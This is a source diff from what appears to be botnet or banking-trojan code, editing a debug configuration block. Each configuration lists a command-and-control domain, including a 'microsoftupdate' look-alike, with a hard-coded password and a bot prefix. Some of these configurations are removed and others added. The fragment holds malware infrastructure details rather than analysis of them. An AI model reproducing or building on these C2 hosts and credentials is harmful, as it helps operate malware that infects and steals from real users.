@@ -111,29 +111,22 @@ const static PCHAR GETFolderExts[] = {".cgi", ".pl", ".doc", ".rtf", ".tpl", ".r
 #ifdef DEBUGCONFIG
 
 
-  /*	char DebugHost[255]	  = "n7reu9qhfoincad9cuhi.com";
-	PCHAR DebugPassword   = "7Xr62vk4Cgx3Apns";
-	char DebugBotPrefix[] = "test";
-	PCHAR DebugDelay      = "1";  */
-
 
 	char DebugHost[255]	  = "rus.gipa.in";
 	PCHAR DebugPassword   = "bRS8yYQ0APq9xfzC";
 	char DebugBotPrefix[] = "afttst"; //"bttest";
 	PCHAR DebugDelay      = "1";
-/*
-	char DebugHost[255]	  = "e9n9e7ifuhdc.org";
-	PCHAR DebugPassword   = "DK4yj9Imo6P4t9i/Rvf+iiKTGE8R99w0UXDs1F97";
-	char DebugBotPrefix[] = "tstbss"; //"bttest";
-	PCHAR DebugDelay      = "1";
-*/
+
+
 
 /*
-	char DebugHost[255] = "microsoftupdate323xcvoiiouf.com";
-	PCHAR DebugPassword = "7Xr62vk4Cgx3Apns";
-	char DebugBotPrefix[] = "bktst";
-	DWORD DebugDelay = 1;
-*/
+	char DebugHost[255]	  = "b8woftwiygef.org";
+	PCHAR DebugPassword   = "7Xr62vk4Cgx3Apns";
+	char DebugBotPrefix[] = "afttst"; //"bttest";
+	PCHAR DebugDelay      = "1";
+    */
+
+
 
 #endif
 
